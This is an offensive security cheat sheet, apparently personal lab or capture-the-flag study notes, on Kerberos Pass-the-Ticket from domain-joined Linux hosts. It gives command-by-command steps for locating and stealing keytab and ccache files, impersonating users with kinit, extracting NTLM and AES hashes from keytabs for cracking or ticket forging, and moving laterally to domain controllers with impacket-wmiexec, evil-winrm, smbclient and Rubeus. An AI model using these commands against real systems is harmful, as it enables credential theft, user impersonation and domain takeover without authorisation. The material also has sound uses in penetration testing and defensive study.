

> [!info] Overview  
> Linux systems can connect to Active Directory using **Kerberos** for centralized authentication.
> 
> If compromised, Kerberos tickets can be abused to impersonate users and move laterally across the domain.

---

## Kerberos Storage on Linux

> [!abstract] Common Storage Types

### **1. ccache files**

Temporary Kerberos credential cache.

**Default location**

```bash
/tmp/krb5cc_*
```

**Environment variable**

```bash
echo $KRB5CCNAME
```

Purpose:

- Stores active Kerberos tickets
    
- Used during authenticated sessions
    

If stolen:

- Immediate user impersonation possible
    

---

### **2. Keytab files**

Files containing:

- Kerberos principals
    
- Encrypted keys derived from passwords
    

Common locations:

```bash
/etc/krb5.keytab
*.keytab
```

Purpose:

- Automated Kerberos authentication
    
- Used in scripts/services
    

If stolen:

- Request new tickets
    
- Extract hashes
    
- Crack passwords
    
- Impersonate users
    

---

## Identifying AD Integration

> [!check] Check if Linux is domain-joined

### Using `realm`

```bash
realm list
```

Look for:

- `configured: kerberos-member`
    
- Domain name
    
- Allowed users/groups
    

---

### Using process checks

```bash
ps -ef | grep -i "winbind\|sssd"
```

Indicators:

- `sssd`
    
- `winbind`
    

---

## Finding Kerberos Tickets

> [!todo] Enumeration targets

### Find keytab files

```bash
find / -name "*keytab*" -ls 2>/dev/null
```

Important:

- Read/write access required
    

---

### Check cronjobs/scripts

Look for:

```bash
kinit
.keytab
-k -t
```

Example:

```bash
crontab -l
cat script.sh
```

This often reveals:

- Service account names
    
- Keytab paths
    

---

### Find ccache files

Check active cache:

```bash
env | grep KRB5
```

Search `/tmp`

```bash
ls -la /tmp
```

---

## Abusing Keytab Files

> [!success] User impersonation

### View keytab details

```bash
klist -k -t file.keytab
```

Shows:

- Principal
    
- Timestamp
    
- Ticket owner
    

---

### Import keytab into session

```bash
kinit user@DOMAIN -k -t file.keytab
```

Verify:

```bash
klist
```

---

### Access resources as impersonated user

```bash
smbclient //target/share -k -c ls
```

---

## Extracting Hashes from Keytabs

> [!warning] Credential extraction

Use:

```bash
python3 keytabextract.py file.keytab
```

Extracts:

- NTLM hash
    
- AES128 hash
    
- AES256 hash
    

Uses:

- Pass-the-Hash
    
- Crack password
    
- Forge Kerberos tickets
    

---

### Crack extracted NTLM

Tools:

- Hashcat
    
- John
    
- Crackstation
    

---

## ccache Abuse

> [!danger] Requires file read access

### Import stolen ccache

```bash
export KRB5CCNAME=/path/to/ccache
```

Verify:

```bash
klist
```

---

### Use stolen identity

```bash
smbclient //dc01/C$ -k -c ls
```

---

## Root-Level Ticket Abuse

> [!danger] Root can impersonate all users

As root:

```bash
ls -la /tmp
```

Copy target cache:

```bash
cp /tmp/krb5cc_xxxx .
```

Load it:

```bash
export KRB5CCNAME=/root/krb5cc_xxxx
```

Check:

```bash
klist
```

---

## Attack Flow

> [!example] Typical escalation path

```text
Compromise Linux host
    ↓
Find keytab / ccache
    ↓
Extract / import
    ↓
Impersonate user
    ↓
Access AD resources
    ↓
Escalate to privileged account
    ↓
Pivot to Domain Controller
```

---

## Using Kerberos with Linux Attack Tools

> [!info] Kerberos-aware tools

### Impacket

```bash
impacket-wmiexec dc01 -k -no-pass
```

---

### Evil-WinRM

```bash
evil-winrm -i dc01 -r domain.htb
```

---

### SMB

```bash
smbclient //dc01/share -k
```

---

## Ticket Conversion

> [!note] Convert Linux ↔ Windows tickets

### ccache → kirbi

```bash
impacket-ticketConverter ticket.ccache ticket.kirbi
```

---

### Import into Windows

```cmd
Rubeus.exe ptt /ticket:ticket.kirbi
```

---

## Important Notes

> [!warning]

### Ticket expiration matters

Always verify:

```bash
klist
```

Check:

- Valid starting
    
- Expires
    

Expired tickets = unusable

---

### KRB5CCNAME formatting

Sometimes Linux uses:

```bash
FILE:/tmp/krb5cc_xxx
```

Some tools require:

```bash
/tmp/krb5cc_xxx
```

Remove `FILE:` if needed.

---

## Key Takeaway

> [!tldr]  
> Pass the Ticket from Linux = stealing **ccache or keytab files** and reusing them to authenticate as domain users without knowing their passwords.